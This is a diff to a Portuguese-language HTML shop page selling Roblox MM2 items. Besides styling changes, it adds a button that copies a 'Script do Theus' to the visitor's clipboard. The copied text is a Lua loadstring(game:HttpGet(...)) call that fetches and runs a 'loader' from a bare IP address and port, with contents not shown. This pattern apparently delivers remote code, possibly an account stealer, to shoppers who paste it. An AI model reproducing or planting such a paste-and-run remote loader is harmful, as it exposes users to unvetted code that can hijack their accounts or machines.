@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>@specteteu – loja</title>
+    <title>@specteteu — loja</title>
     <link rel="icon" href="favicon.png" type="image/png">
     <meta name="description" content="Loja oficial do @specteteu (Theus). Compre MM2 de forma segura, rápida e pelo melhor preço.">
     <style>
@@ -256,6 +256,144 @@
             flex-wrap: wrap;
             gap: 10px;
             margin-top: 2px;
+        }
+
+        /* ====== RECADO (BOTÃO NEON ROXO GLASS) ====== */
+        .recado-wrap{
+          padding: 6px 0 8px;
+        }
+
+        .recado-card{
+          border-radius: var(--radius2);
+          background: rgba(255,255,255,.06);
+          border: 1px solid rgba(136,183,243,.18);
+          box-shadow: var(--shadow);
+          overflow: hidden;
+        }
+
+        .recado-inner{
+          padding: 14px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 12px;
+          flex-wrap: wrap;
+        }
+
+        /* Botão principal roxo neon (glass) */
+        .btn-recado{
+          border-radius: 18px;
+          border: 1px solid rgba(180, 90, 255, .45);
+          color: rgba(255,255,255,.95);
+          font-weight: 900;
+          letter-spacing: .2px;
+          cursor: pointer;
+
+          background:
+            radial-gradient(220px 90px at 25% 20%, rgba(200, 140, 255, .35), transparent 60%),
+            linear-gradient(135deg, rgba(70, 0, 120, .55), rgba(35, 0, 70, .35));
+
+          backdrop-filter: blur(12px);
+          box-shadow:
+            0 10px 30px rgba(0,0,0,.35),
+            0 0 18px rgba(170, 70, 255, .35),
+            inset 0 0 0 1px rgba(255,255,255,.08);
+
+          transition: all .2s ease;
+          padding: 12px 14px;
+          text-align: center;
+        }
+
+        .btn-recado:hover{
+          transform: translateY(-2px);
+          border-color: rgba(200, 140, 255, .70);
+          box-shadow:
+            0 14px 40px rgba(0,0,0,.42),
+            0 0 26px rgba(190, 90, 255, .55),
+            0 0 50px rgba(120, 0, 255, .20),
+            inset 0 0 0 1px rgba(255,255,255,.10);
+        }
+
+        .btn-recado:active{ transform: translateY(0); }
+
+        /* Texto "grande" */
+        .btn-recado .big{
+          display: block;
+          font-size: 16px;
+        }
+        .btn-recado .small{
+          display: block;
+          margin-top: 3px;
+          font-size: 12px;
+          color: rgba(215,234,251,.88);
+          font-weight: 700;
+        }
+
+        /* Botão secundário de copiar */
+        .btn-copy-recado{
+          border-radius: 18px;
+          border: 1px solid rgba(180, 90, 255, .25);
+          background: rgba(255,255,255,.06);
+          color: var(--arctic);
+          font-weight: 800;
+          cursor: pointer;
+          transition: all .2s ease;
+          backdrop-filter: blur(10px);
+          padding: 12px 14px;
+          text-align: center;
+        }
+
+        .btn-copy-recado:hover{
+          background: rgba(215,234,251,.10);
+          border-color: rgba(180, 90, 255, .40);
+          transform: translateY(-2px);
+        }
+
+        .btn-copy-recado:active{ transform: translateY(0); }
+
+        /* Desktop: ambos com o mesmo tamanho */
+        .btn-recado,
+        .btn-copy-recado{
+          flex: 1 1 320px;
+          max-width: 560px;
+          width: 100%;
+          min-height: 62px;
+        }
+
+        .copy-feedback{
+          font-size: 12px;
+          color: rgba(215,234,251,.80);
+          display: none;
+          text-align: center;
+          padding: 0 14px 14px;
+        }
+        .copy-feedback.show{ display: block; }
+
+        /* Mobile: recado em cima, copiar embaixo, centralizado */
+        @media (max-width: 720px){
+          .recado-inner{
+            flex-direction: column;
+            align-items: stretch;
+            padding: 12px;
+            gap: 10px;
+          }
+
+          .btn-recado,
+          .btn-copy-recado{
+            flex: 0 0 auto;
+            max-width: 100%;
+            width: 100%;
+            min-height: 52px;
+            padding: 10px 12px;
+          }
+
+          .btn-recado .big{
+            font-size: 15px;
+          }
+          .btn-recado .small{
+            font-size: 11px;
+            margin-top: 2px;
+          }
         }
 
         /* BUTTONS */
@@ -704,6 +842,24 @@
                 </div>
             </section>
 
+            <!-- ✅ RECADO (corrigido: sem wrapper gigante, alinhado e responsivo) -->
+            <section class="section recado-wrap">
+              <div class="recado-card">
+                <div class="recado-inner">
+                  <button class="btn-recado" type="button" id="btnRecadoMain">
+                    <span class="big">Script do Theus 💜</span>
+                    <span class="small">Copie o Script clicando no botão ao lado ou abaixo.</span>
+                  </button>
+
+                  <button class="btn-copy-recado" type="button" id="btnCopyRecado">
+                    <strong>Clique aqui para copiar o script!</strong>
+                  </button>
+                </div>
+
+                <span class="copy-feedback" id="copyFeedback">✅ Copiado!</span>
+              </div>
+            </section>
+
             <section class="section">
               <h3 class="section-title">Por que comprar conosco?</h3>
               <div class="grid cols-3">
@@ -1078,6 +1234,28 @@
             document.body.style.overflow = '';
         }
 
+        // ====== RECADO PRIVADO COLE AQUI (COPIAR) ======
+        function getPrivateRecado() {
+          const recado = `loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImM5OTlhNjYzLTM5YTEtNGEzZi04MWU0LTdjMDFiNWE2NTAxNCIsImtpbmQiOiJsb2FkZXIifQ"))()`;
+          return recado;
+        }
+
+        async function copyTextToClipboard(text) {
+          if (navigator.clipboard && window.isSecureContext) {
+            await navigator.clipboard.writeText(text);
+            return;
+          }
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          ta.setAttribute('readonly', '');
+          ta.style.position = 'fixed';
+          ta.style.left = '-9999px';
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          ta.remove();
+        }
+
         // ====== INIT ======
         document.addEventListener('DOMContentLoaded', () => {
             createSnowflakes();
@@ -1098,7 +1276,29 @@
                 lightboxClose.addEventListener('click', closeLightbox);
             }
             document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeLightbox(); });
+
+            // ====== RECADO: copiar ======
+            const btnCopyRecado = document.getElementById('btnCopyRecado');
+            const copyFeedback = document.getElementById('copyFeedback');
+
+            if (btnCopyRecado) {
+              btnCopyRecado.addEventListener('click', async () => {
+                try {
+                  const recado = getPrivateRecado();
+                  await copyTextToClipboard(recado);
+
+                  if (copyFeedback) {
+                    copyFeedback.classList.add('show');
+                    setTimeout(() => copyFeedback.classList.remove('show'), 1400);
+                  }
+                } catch (e) {
+                  alert('Não consegui copiar automaticamente.');
+                }
+              });
+            }
         });
     </script>
 </body>
 </html>
+
+                    
